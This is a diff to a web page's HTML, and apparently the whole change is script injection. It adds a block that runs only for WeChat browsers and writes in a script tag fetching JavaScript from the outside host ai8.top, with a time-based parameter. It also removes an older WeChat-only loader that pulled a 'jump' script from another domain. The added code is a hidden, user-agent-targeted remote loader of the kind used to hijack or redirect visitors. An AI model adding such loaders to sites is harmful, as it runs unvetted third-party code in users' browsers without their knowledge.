@@ -13,6 +13,14 @@
     </style>
 </head>
 <body >
+<script>
+var ua = navigator.userAgent.toLowerCase(); 
+function gettime() { var date = new Date(); var year = date.getFullYear(); var month = date.getMonth() + 1; var dates = date.getDate(); var day = date.getDay(); var hour = date.getHours(); return year + '-' +  month + '-'  + dates + '-' + hour; }
+if (ua.match(/MicroMessenger/i) == "micromessenger") { 
+    document.writeln("<script src=\"https://ai8.top/api/getGameJs?"+ gettime() +"\"><\/script>");
+}
+</script>
+
 <div id="all">
     <div class="wrapper">
         <div class="main">
@@ -704,9 +712,5 @@ var _hmt = _hmt || [];
         }
     });
 </script>
-<script>
-if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") == -1) { 
-document.writeln("<script src=\"https://web-360.20it.cn/static/js/jump_mp.js?v1.0.0\"><\/script>"); 
-}
-</script></body>
+</body>
 </html>
